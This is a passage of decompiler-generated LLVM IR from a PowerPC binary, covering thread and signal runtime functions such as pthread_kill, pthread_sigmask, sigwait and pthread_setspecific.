  %v1_100075ec = add i32 %v0_100075ec, -1
  %v2_100075f0 = icmp ugt i32 %v1_100075ec, 63
  br i1 %v2_100075f0, label %dec_label_pc_10007640, label %dec_label_pc_100075f8

dec_label_pc_100075f8:                            ; preds = %dec_label_pc_100075ec
  %v0_100075f8 = load i32, i32* @r28, align 4
  %v3_100075f8 = icmp eq i32 %v0_100075f8, 0
  br i1 %v3_100075f8, label %dec_label_pc_10007614, label %dec_label_pc_10007600

dec_label_pc_10007600:                            ; preds = %dec_label_pc_100075f8
  %v1_10007604 = mul i32 %v0_100075ec, 4
  store i32 ptrtoint (i32* @global_var_1002c850.245 to i32), i32* @r9, align 4
  %v2_1000760c = add i32 %v1_10007604, ptrtoint (i32* @global_var_1002c850.245 to i32)
  %v3_1000760c = inttoptr i32 %v2_1000760c to i32*
  %v4_1000760c = load i32, i32* %v3_1000760c, align 4
  %v2_10007610 = inttoptr i32 %v0_100075f8 to i32*
  store i32 %v4_1000760c, i32* %v2_10007610, align 4
  br label %dec_label_pc_10007614

dec_label_pc_10007614:                            ; preds = %dec_label_pc_100075f8, %dec_label_pc_10007600
  %v0_10007614 = load i32, i32* @r30, align 4
  %v3_10007614 = icmp eq i32 %v0_10007614, 0
  br i1 %v3_10007614, label %dec_label_pc_10007640, label %dec_label_pc_1000761c

dec_label_pc_1000761c:                            ; preds = %dec_label_pc_10007614
  %v1_1000761c = inttoptr i32 %v0_10007614 to i32*
  %v2_1000761c = load i32, i32* %v1_1000761c, align 4
  store i32 %v2_1000761c, i32* @r11, align 4
  %v0_10007624 = load i32, i32* @r31, align 4
  %v1_10007624 = mul i32 %v0_10007624, 4
  store i32 ptrtoint (i32* @global_var_1002c850.245 to i32), i32* @r9, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10007630 = add i32 %v1_10007624, ptrtoint (i32* @global_var_1002c850.245 to i32)
  %v4_10007630 = inttoptr i32 %v3_10007630 to i32*
  store i32 %v2_1000761c, i32* %v4_10007630, align 4
  %v0_10007654.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007644

dec_label_pc_10007638:                            ; preds = %dec_label_pc_1000755c, %dec_label_pc_1000753c, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007644

dec_label_pc_10007640:                            ; preds = %dec_label_pc_10007614, %dec_label_pc_100075ec
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007644

dec_label_pc_10007644:                            ; preds = %dec_label_pc_100075d0, %dec_label_pc_10007638, %dec_label_pc_1000761c, %dec_label_pc_10007640
  %v0_10007654 = phi i32 [ -1, %dec_label_pc_100075d0 ], [ 22, %dec_label_pc_10007638 ], [ %v0_10007654.pre, %dec_label_pc_1000761c ], [ 0, %dec_label_pc_10007640 ]
  ret i32 %v0_10007654

; uselistorder directives
  uselistorder i32 %v0_100075d8, { 1, 0 }
  uselistorder i32 %v0_100075d8.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10007570, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder label %dec_label_pc_10007644, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10007614, { 1, 0 }
  uselistorder label %dec_label_pc_100075d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100075cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007564, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007670 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10007674 = add i32 %v1_10007670, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %v2_10007674, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268465804, i32* @lr, align 4
  %v0_10007688 = call i32 @__pthread_lock()
  %v0_1000768c = load i32, i32* @r31, align 4
  %v1_1000768c = add i32 %v0_1000768c, 8
  %v2_1000768c = inttoptr i32 %v1_1000768c to i32*
  %v3_1000768c = load i32, i32* %v2_1000768c, align 4
  store i32 %v0_1000768c, i32* @r3, align 4
  %v3_10007694 = icmp eq i32 %v3_1000768c, 0
  br i1 %v3_10007694, label %dec_label_pc_100076a8, label %dec_label_pc_1000769c

dec_label_pc_1000769c:                            ; preds = %entry
  %v1_1000769c = add i32 %v3_1000768c, 16
  %v2_1000769c = inttoptr i32 %v1_1000769c to i32*
  %v3_1000769c = load i32, i32* %v2_1000769c, align 4
  %v0_100076a0 = load i32, i32* @r29, align 4
  %v4_100076a0 = icmp eq i32 %v0_100076a0, %v3_1000769c
  br i1 %v4_100076a0, label %dec_label_pc_100076b4, label %dec_label_pc_100076a8

dec_label_pc_100076a8:                            ; preds = %dec_label_pc_1000769c, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100076ac.246 to i32), i32* @lr, align 4
  %v0_100076a8 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100076e0

dec_label_pc_100076b4:                            ; preds = %dec_label_pc_1000769c
  %v1_100076b4 = add i32 %v3_1000768c, 20
  %v2_100076b4 = inttoptr i32 %v1_100076b4 to i32*
  %v3_100076b4 = load i32, i32* %v2_100076b4, align 4
  store i32 %v0_1000768c, i32* @r3, align 4
  store i32 268465856, i32* @lr, align 4
  %v0_100076bc = call i32 @__pthread_unlock()
  %v0_100076c0 = load i32, i32* @r30, align 4
  store i32 268465868, i32* @lr, align 4
  %v2_100076c8 = call i32 @kill(i32 %v3_100076b4, i32 %v0_100076c0)
  %v3_100076cc = icmp eq i32 %v2_100076c8, -1
  br i1 %v3_100076cc, label %dec_label_pc_100076d8, label %dec_label_pc_100076e0

dec_label_pc_100076d8:                            ; preds = %dec_label_pc_100076b4
  %v0_100076d8 = call i32 @__errno_location()
  %v1_100076dc = inttoptr i32 %v0_100076d8 to i32*
  %v2_100076dc = load i32, i32* %v1_100076dc, align 4
  br label %dec_label_pc_100076e0

dec_label_pc_100076e0:                            ; preds = %dec_label_pc_100076b4, %dec_label_pc_100076a8, %dec_label_pc_100076d8
  %v0_100076f0 = phi i32 [ 0, %dec_label_pc_100076b4 ], [ 3, %dec_label_pc_100076a8 ], [ %v2_100076dc, %dec_label_pc_100076d8 ]
  ret i32 %v0_100076f0

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 5, 4, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10027f00.170 to i32), { 0, 8, 9, 12, 7, 13, 10, 11, 14, 1, 2, 3, 4, 15, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100076e0, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10007708 = call i32 @__GI_pthread_self()
  store i32 268465940, i32* @lr, align 4
  %v2_10007710 = call i32 @pthread_kill(i32 %v0_10007708, i32 %arg1)
  store i32 %v2_10007710, i32* @r29, align 4
  %v3_10007714 = icmp eq i32 %v2_10007710, 0
  br i1 %v3_10007714, label %dec_label_pc_1000772c, label %dec_label_pc_10007720

dec_label_pc_10007720:                            ; preds = %entry
  %v0_10007720 = call i32 @__errno_location()
  %v0_10007724 = load i32, i32* @r29, align 4
  %v2_10007724 = inttoptr i32 %v0_10007720 to i32*
  store i32 %v0_10007724, i32* %v2_10007724, align 4
  br label %dec_label_pc_1000772c

dec_label_pc_1000772c:                            ; preds = %entry, %dec_label_pc_10007720
  %v0_1000773c = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_10007720 ]
  ret i32 %v0_1000773c

; uselistorder directives
  uselistorder label %dec_label_pc_1000772c, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-152 = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  %v3_10007754 = icmp eq i32 %arg2, 0
  store i32 %arg3, i32* %r29.global-to-local, align 4
  br i1 %v3_10007754, label %dec_label_pc_100077dc, label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %entry
  %v2_10007760 = ptrtoint i32* %stack_var_-152 to i32
  store i32 128, i32* @r5, align 4
  store i32 %v2_10007760, i32* @r3, align 4
  store i32 268466032, i32* @lr, align 4
  %v0_1000776c = call i32 @memcpy()
  %v0_10007770 = load i32, i32* %r30.global-to-local, align 4
  %v3_10007770 = icmp eq i32 %v0_10007770, 1
  br i1 %v3_10007770, label %dec_label_pc_100077c0, label %dec_label_pc_10007778

dec_label_pc_10007778:                            ; preds = %dec_label_pc_10007760
  %v3_10007778 = icmp eq i32 %v0_10007770, 2
  br i1 %v3_10007778, label %dec_label_pc_1000778c, label %dec_label_pc_10007780

dec_label_pc_10007780:                            ; preds = %dec_label_pc_10007778
  %v3_10007780 = icmp eq i32 %v0_10007770, 0
  br i1 %v3_10007780, label %dec_label_pc_1000779c, label %dec_label_pc_100077d8

dec_label_pc_1000778c:                            ; preds = %dec_label_pc_10007778
  store i32 %v2_10007760, i32* @r3, align 4
  %v3_10007794 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 268466076, i32* @lr, align 4
  %v2_10007798 = call i32 @__GI_sigaddset(i32 %v2_10007760, i32 %v3_10007794)
  br label %dec_label_pc_1000779c

dec_label_pc_1000779c:                            ; preds = %dec_label_pc_10007780, %dec_label_pc_1000778c
  store i32 %v2_10007760, i32* @r3, align 4
  store i32 268466092, i32* @lr, align 4
  %v1_100077a8 = call i32 @__GI_sigdelset(i32 %v2_10007760)
  %v3_100077b0 = load i32, i32* @global_var_1002c280.138, align 4
  %tmp6 = icmp slt i32 %v3_100077b0, 1
  br i1 %tmp6, label %dec_label_pc_100077d8, label %dec_label_pc_100077c8

dec_label_pc_100077c0:                            ; preds = %dec_label_pc_10007760
  br label %dec_label_pc_100077c8

dec_label_pc_100077c8:                            ; preds = %dec_label_pc_1000779c, %dec_label_pc_100077c0
  store i32 %v2_10007760, i32* @r3, align 4
  store i32 268466128, i32* @lr, align 4
  %v1_100077cc = call i32 @__GI_sigdelset(i32 %v2_10007760)
  br label %dec_label_pc_100077dc

dec_label_pc_100077d8:                            ; preds = %dec_label_pc_10007780, %dec_label_pc_1000779c
  br label %dec_label_pc_100077dc

dec_label_pc_100077dc:                            ; preds = %entry, %dec_label_pc_100077c8, %dec_label_pc_100077d8
  %v0_100077e0 = phi i32 [ 0, %entry ], [ %v2_10007760, %dec_label_pc_100077c8 ], [ %v2_10007760, %dec_label_pc_100077d8 ]
  %v0_100077dc = load i32, i32* %r30.global-to-local, align 4
  %v0_100077e4 = load i32, i32* %r29.global-to-local, align 4
  store i32 268466156, i32* @lr, align 4
  %v3_100077e8 = call i32 @__GI_sigprocmask(i32 %v0_100077dc, i32 %v0_100077e0, i32 %v0_100077e4)
  %v3_100077ec = icmp eq i32 %v3_100077e8, -1
  br i1 %v3_100077ec, label %dec_label_pc_100077f8, label %dec_label_pc_10007800

dec_label_pc_100077f8:                            ; preds = %dec_label_pc_100077dc
  %v0_100077f8 = call i32 @__errno_location()
  %v1_100077fc = inttoptr i32 %v0_100077f8 to i32*
  %v2_100077fc = load i32, i32* %v1_100077fc, align 4
  br label %dec_label_pc_10007800

dec_label_pc_10007800:                            ; preds = %dec_label_pc_100077dc, %dec_label_pc_100077f8
  %v0_10007810 = phi i32 [ 0, %dec_label_pc_100077dc ], [ %v2_100077fc, %dec_label_pc_100077f8 ]
  ret i32 %v0_10007810

; uselistorder directives
  uselistorder i32 %v2_10007760, { 0, 1, 7, 6, 3, 2, 5, 4, 8 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007800, { 1, 0 }
  uselistorder label %dec_label_pc_100077dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100077d8, { 1, 0 }
  uselistorder label %dec_label_pc_100077c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000779c, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_10007814 = load i32, i32* @lr, align 4
  store i32 %v0_10007814, i32* %r0.global-to-local, align 4
  %v4_10007818 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007818, i32* %stack_var_-32, align 4
  %v5_10007818 = ptrtoint i32* %stack_var_-32 to i32
  %v0_1000781c = call i32 @__asm_mfcr()
  %v1_10007820 = mul i32 %v0_1000781c, 4
  store i32 %v1_10007820, i32* %r11.global-to-local, align 4
  %v0_10007828 = load i32, i32* @r2, align 4
  store i32 %v0_10007828, i32* %r31.global-to-local, align 4
  %v0_1000782c = load i32, i32* %r0.global-to-local, align 4
  %v1_10007834 = add i32 %v0_10007828, 88
  %v2_10007834 = inttoptr i32 %v1_10007834 to i8*
  %v3_10007834 = load i8, i8* %v2_10007834, align 1
  %v4_10007834 = zext i8 %v3_10007834 to i32
  store i32 %v4_10007834, i32* %r0.global-to-local, align 4
  %v3_10007838 = icmp eq i8 %v3_10007834, 0
  br i1 %v3_10007838, label %dec_label_pc_10007850, label %dec_label_pc_10007840

dec_label_pc_10007840:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007844 = add i32 %v0_10007828, 32
  %v3_10007844 = inttoptr i32 %v2_10007844 to i32*
  store i32 %v0_1000781c, i32* %v3_10007844, align 4
  %v0_10007848 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007848 = trunc i32 %v0_10007848 to i8
  %v2_10007848 = load i32, i32* @r2, align 4
  %v3_10007848 = add i32 %v2_10007848, 88
  %v4_10007848 = inttoptr i32 %v3_10007848 to i8*
  store i8 %v1_10007848, i8* %v4_10007848, align 1
  br label %dec_label_pc_1000787c

dec_label_pc_10007850:                            ; preds = %entry
  %v1_10007850 = add i32 %v0_10007828, 84
  %v2_10007850 = inttoptr i32 %v1_10007850 to i32*
  %v3_10007850 = load i32, i32* %v2_10007850, align 4
  store i32 %v3_10007850, i32* %r30.global-to-local, align 4
  %v3_10007854 = icmp eq i32 %v3_10007850, 0
  store i1 %v3_10007854, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10007854, label %dec_label_pc_1000785c, label %dec_label_pc_10007860

dec_label_pc_1000785c:                            ; preds = %dec_label_pc_10007850
  store i32 %v5_10007818, i32* %v2_10007850, align 4
  %v0_10007868.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007860

dec_label_pc_10007860:                            ; preds = %dec_label_pc_10007850, %dec_label_pc_1000785c
  %v0_10007868 = phi i32 [ %v1_10007820, %dec_label_pc_10007850 ], [ %v0_10007868.pre, %dec_label_pc_1000785c ]
  %v2_10007868 = add i32 %v0_10007868, ptrtoint (i32* @global_var_1002c850.245 to i32)
  %v3_10007868 = inttoptr i32 %v2_10007868 to i32*
  %v4_10007868 = load i32, i32* %v3_10007868, align 4
  store i32 %v4_10007868, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10007868)
  %v0_10007874 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10007874, label %dec_label_pc_10007878, label %dec_label_pc_1000787c

dec_label_pc_10007878:                            ; preds = %dec_label_pc_10007860
  %v0_10007878 = load i32, i32* %r30.global-to-local, align 4
  %v1_10007878 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007878 = add i32 %v1_10007878, 84
  %v3_10007878 = inttoptr i32 %v2_10007878 to i32*
  store i32 %v0_10007878, i32* %v3_10007878, align 4
  br label %dec_label_pc_1000787c

dec_label_pc_1000787c:                            ; preds = %dec_label_pc_10007860, %dec_label_pc_10007840, %dec_label_pc_10007878
  store i32 %v0_1000782c, i32* %r0.global-to-local, align 4
  %v1_1000788c = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000781c)
  ret i32 %v0_1000781c

; uselistorder directives
  uselistorder i32 %v1_10007820, { 1, 0 }
  uselistorder i32 %v0_1000781c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000787c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007860, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-772 = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %v0_1000789c = load i32, i32* @lr, align 4
  store i32 %v0_1000789c, i32* %r0.global-to-local, align 4
  %v2_100078a4 = ptrtoint i32* %stack_var_-900 to i32
  store i32 %arg1, i32* @r31, align 4
  %v0_100078b8 = load i32, i32* @r2, align 4
  store i32 268466368, i32* @lr, align 4
  %v1_100078bc = call i32 @sigfillset(i32 %v2_100078a4)
  store i32 %v2_100078a4, i32* @r3, align 4
  store i32 1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100078d4.247 to i32), i32* @lr, align 4
  %v1_100078d0 = call i32 @__GI_sigdelset(i32 %v2_100078a4)
  %v0_100079681 = load i32, i32* @r29, align 4
  %v0_100079706 = load i32, i32* @r31, align 4
  store i32 %v0_100079706, i32* @r3, align 4
  %tmp22 = icmp slt i32 %v0_100079681, 66
  br i1 %tmp22, label %dec_label_pc_100078d8.lr.ph, label %dec_label_pc_10007978

dec_label_pc_100078d8.lr.ph:                      ; preds = %entry
  %v2_10007930 = ptrtoint i32* %stack_var_-768 to i32
  br label %dec_label_pc_100078d8

dec_label_pc_100078d8:                            ; preds = %dec_label_pc_100078d8.lr.ph, %dec_label_pc_10007964
  %v0_1000797010 = phi i32 [ %v0_100079706, %dec_label_pc_100078d8.lr.ph ], [ %v0_10007970, %dec_label_pc_10007964 ]
  %v0_1000796c9 = phi i32 [ %v0_100079681, %dec_label_pc_100078d8.lr.ph ], [ %v1_10007964, %dec_label_pc_10007964 ]
  store i32 268466396, i32* @lr, align 4
  %v2_100078d8 = call i32 @sigismember(i32 %v0_1000797010, i32 %v0_1000796c9)
  %v3_100078dc = icmp eq i32 %v2_100078d8, 0
  br i1 %v3_100078dc, label %dec_label_pc_10007964, label %dec_label_pc_100078e4

dec_label_pc_100078e4:                            ; preds = %dec_label_pc_100078d8
  %v3_100078e8 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 %v3_100078e8, i32* %r0.global-to-local, align 4
  %v0_100078ec = load i32, i32* @r29, align 4
  %v4_100078ec = icmp eq i32 %v0_100078ec, %v3_100078e8
  br i1 %v4_100078ec, label %dec_label_pc_10007964, label %dec_label_pc_100078f4

dec_label_pc_100078f4:                            ; preds = %dec_label_pc_100078e4
  %v3_100078f8 = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 %v3_100078f8, i32* %r0.global-to-local, align 4
  %v4_100078fc = icmp eq i32 %v0_100078ec, %v3_100078f8
  br i1 %v4_100078fc, label %dec_label_pc_10007964, label %dec_label_pc_10007904

dec_label_pc_10007904:                            ; preds = %dec_label_pc_100078f4
  %v3_1000790c = load i32, i32* @global_var_1002c280.138, align 4
  store i32 %v3_1000790c, i32* %r0.global-to-local, align 4
  store i32 %v2_100078a4, i32* @r3, align 4
  %v4_10007914 = icmp eq i32 %v0_100078ec, %v3_1000790c
  br i1 %v4_10007914, label %dec_label_pc_10007964, label %dec_label_pc_1000791c

dec_label_pc_1000791c:                            ; preds = %dec_label_pc_10007904
  store i32 268466464, i32* @lr, align 4
  %v1_1000791c = call i32 @__GI_sigdelset(i32 %v2_100078a4)
  %v0_10007924 = load i32, i32* @r29, align 4
  %v1_10007924 = mul i32 %v0_10007924, 4
  store i32 %v1_10007924, i32* %r0.global-to-local, align 4
  %v2_1000792c = add i32 %v1_10007924, ptrtoint (i32* @global_var_1002c850.245 to i32)
  %v3_1000792c = inttoptr i32 %v2_1000792c to i32*
  %v4_1000792c = load i32, i32* %v3_1000792c, align 4
  store i32 %v4_1000792c, i32* %r0.global-to-local, align 4
  %v2_10007934 = icmp ugt i32 %v4_1000792c, 1
  br i1 %v2_10007934, label %dec_label_pc_10007964, label %dec_label_pc_1000793c

dec_label_pc_1000793c:                            ; preds = %dec_label_pc_1000791c
  store i32 268465420, i32* %stack_var_-772, align 4
  store i32 268466508, i32* @lr, align 4
  %v1_10007948 = call i32 @sigemptyset(i32 %v2_10007930)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10007954 = load i32, i32* @r29, align 4
  store i32 268466532, i32* @lr, align 4
  %v4_10007960 = call i32 @__GI_sigaction(i32 %v0_10007954, i32* nonnull %stack_var_-772, i32 0)
  br label %dec_label_pc_10007964

dec_label_pc_10007964:                            ; preds = %dec_label_pc_1000791c, %dec_label_pc_10007904, %dec_label_pc_100078f4, %dec_label_pc_100078e4, %dec_label_pc_100078d8, %dec_label_pc_1000793c
  %v0_10007964 = load i32, i32* @r29, align 4
  %v1_10007964 = add i32 %v0_10007964, 1
  store i32 %v1_10007964, i32* @r29, align 4
  %v0_10007970 = load i32, i32* @r31, align 4
  store i32 %v0_10007970, i32* @r3, align 4
  %tmp23 = icmp slt i32 %v1_10007964, 66
  br i1 %tmp23, label %dec_label_pc_100078d8, label %dec_label_pc_10007978

dec_label_pc_10007978:                            ; preds = %dec_label_pc_10007964, %entry
  %v2_10007978 = ptrtoint i32* %stack_var_-624 to i32
  store i32 1, i32* @r4, align 4
  store i32 268466564, i32* @lr, align 4
  %v3_10007980 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_10007984 = icmp eq i32 %v3_10007980, 0
  br i1 %v3_10007984, label %dec_label_pc_1000798c, label %dec_label_pc_10007978.dec_label_pc_100079d4_crit_edge

dec_label_pc_10007978.dec_label_pc_100079d4_crit_edge: ; preds = %dec_label_pc_10007978
  %.pre = add i32 %v0_100078b8, 40
  %.pre11 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_100079d4

dec_label_pc_1000798c:                            ; preds = %dec_label_pc_10007978
  store i32 %v2_10007978, i32* %r0.global-to-local, align 4
  %v2_10007994 = add i32 %v0_100078b8, 40
  %v3_10007994 = inttoptr i32 %v2_10007994 to i32*
  store i32 %v2_10007978, i32* %v3_10007994, align 4
  %v1_1000799c = add i32 %v0_100078b8, 66
  %v2_1000799c = inttoptr i32 %v1_1000799c to i8*
  %v3_1000799c = load i8, i8* %v2_1000799c, align 1
  %v4_1000799c = zext i8 %v3_1000799c to i32
  store i32 %v4_1000799c, i32* %r0.global-to-local, align 4
  %v3_100079a0 = icmp eq i8 %v3_1000799c, 0
  br i1 %v3_100079a0, label %dec_label_pc_100079b8, label %dec_label_pc_100079a8

dec_label_pc_100079a8:                            ; preds = %dec_label_pc_1000798c
  %v1_100079ac = add i32 %v0_100078b8, 64
  %v2_100079ac = inttoptr i32 %v1_100079ac to i8*
  %v3_100079ac = load i8, i8* %v2_100079ac, align 1
  %v4_100079ac = zext i8 %v3_100079ac to i32
  store i32 %v4_100079ac, i32* %r0.global-to-local, align 4
  %v3_100079b0 = icmp eq i8 %v3_100079ac, 0
  br i1 %v3_100079b0, label %dec_label_pc_100079d4, label %dec_label_pc_100079b8

dec_label_pc_100079b8:                            ; preds = %dec_label_pc_100079a8, %dec_label_pc_1000798c
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100079c0 = add i32 %v0_100078b8, 32
  %v3_100079c0 = inttoptr i32 %v2_100079c0 to i32*
  store i32 0, i32* %v3_100079c0, align 4
  %v0_100079cc = load i32, i32* %r0.global-to-local, align 4
  %v1_100079cc = trunc i32 %v0_100079cc to i8
  %v3_100079cc = add i32 %v0_100078b8, 88
  %v4_100079cc = inttoptr i32 %v3_100079cc to i8*
  store i8 %v1_100079cc, i8* %v4_100079cc, align 1
  store i32 268466644, i32* @lr, align 4
  %v1_100079d0 = call i32 @__libc_sigsuspend(i32 %v2_100078a4)
  br label %dec_label_pc_100079d4

dec_label_pc_100079d4:                            ; preds = %dec_label_pc_10007978.dec_label_pc_100079d4_crit_edge, %dec_label_pc_100079a8, %dec_label_pc_100079b8
  %v3_100079dc.pre-phi = phi i32* [ %.pre11, %dec_label_pc_10007978.dec_label_pc_100079d4_crit_edge ], [ %v3_10007994, %dec_label_pc_100079a8 ], [ %v3_10007994, %dec_label_pc_100079b8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_100079dc.pre-phi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100079e4.248 to i32), i32* @lr, align 4
  %v1_100079e0 = call i32 @pthread_testcancel(i32 %v0_100078b8)
  %v1_100079ec = add i32 %v0_100078b8, 32
  %v2_100079ec = inttoptr i32 %v1_100079ec to i32*
  %v3_100079ec = load i32, i32* %v2_100079ec, align 4
  store i32 %v3_100079ec, i32* %arg2, align 4
  store i32 %v0_1000789c, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10007970, { 1, 0 }
  uselistorder i32 %v1_10007964, { 0, 2, 1 }
  uselistorder i32 %v1_10007924, { 1, 0 }
  uselistorder i32 %v0_100079681, { 1, 0 }
  uselistorder i32 %v0_100078b8, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %v2_100078a4, { 2, 0, 3, 5, 4, 1 }
  uselistorder i32 (i32)* @__libc_sigsuspend, { 1, 0 }
  uselistorder i32 (i32)* @sigemptyset, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c850.245 to i32), { 0, 1, 2, 5, 3, 6, 4 }
  uselistorder i32 66, { 3, 0, 1, 4, 5, 12, 10, 6, 7, 13, 8, 9, 11, 2 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder label %dec_label_pc_100079d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007964, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_100078d8, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %v2_10007a0c = icmp ugt i32 %arg1, 1023
  store i32 22, i32* @r10, align 4
  store i32 %arg2, i32* @r27, align 4
  %v0_10007a30 = load i32, i32* @r2, align 4
  store i32 %v0_10007a30, i32* @r28, align 4
  br i1 %v2_10007a0c, label %dec_label_pc_10007a9c, label %dec_label_pc_10007a38

dec_label_pc_10007a38:                            ; preds = %entry
  %v1_10007a2c = mul i32 %arg1, 8
  %v1_10007a38 = udiv i32 %arg1, 32
  store i32 %v1_10007a38, i32* @r29, align 4
  %v2_10007a50 = add i32 %v1_10007a2c, ptrtoint (i32* @global_var_1002c954.249 to i32)
  %v3_10007a50 = inttoptr i32 %v2_10007a50 to i32*
  %v4_10007a50 = load i32, i32* %v3_10007a50, align 4
  %v3_10007a54 = icmp eq i32 %v4_10007a50, 0
  br i1 %v3_10007a54, label %dec_label_pc_10007a9c, label %dec_label_pc_10007a5c

dec_label_pc_10007a5c:                            ; preds = %dec_label_pc_10007a38
  %v1_10007a3c = mul nuw nsw i32 %v1_10007a38, 4
  %v2_10007a40 = add i32 %v0_10007a30, %v1_10007a3c
  %v1_10007a5c = add i32 %v2_10007a40, 236
  %v2_10007a5c = inttoptr i32 %v1_10007a5c to i32*
  %v3_10007a5c = load i32, i32* %v2_10007a5c, align 4
  %v3_10007a68 = icmp eq i32 %v3_10007a5c, 0
  br i1 %v3_10007a68, label %dec_label_pc_10007a70, label %dec_label_pc_10007a84

dec_label_pc_10007a70:                            ; preds = %dec_label_pc_10007a5c
  store i32 ptrtoint ([3 x i8]* @global_var_10007a74.250 to i32), i32* @lr, align 4
  %v2_10007a70 = call i32 @calloc(i32 32, i32 4)
  store i32 12, i32* %r10.global-to-local, align 4
  %v3_10007a78 = icmp eq i32 %v2_10007a70, 0
  br i1 %v3_10007a78, label %dec_label_pc_10007a9c, label %dec_label_pc_10007a80

dec_label_pc_10007a80:                            ; preds = %dec_label_pc_10007a70
  %v1_10007a80 = load i32, i32* @r30, align 4
  %v2_10007a80 = add i32 %v1_10007a80, 12
  %v3_10007a80 = inttoptr i32 %v2_10007a80 to i32*
  store i32 %v2_10007a70, i32* %v3_10007a80, align 4
  %v0_10007a84.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007a84

dec_label_pc_10007a84:                            ; preds = %dec_label_pc_10007a5c, %dec_label_pc_10007a80
  %v0_10007a84 = phi i32 [ %v1_10007a38, %dec_label_pc_10007a5c ], [ %v0_10007a84.pre, %dec_label_pc_10007a80 ]
  %v1_10007a84 = mul i32 %v0_10007a84, 4
  %v1_10007a88 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10007a8c = load i32, i32* @r28, align 4
  %v2_10007a8c = add i32 %v1_10007a8c, %v1_10007a84
  store i32 0, i32* %r10.global-to-local, align 4
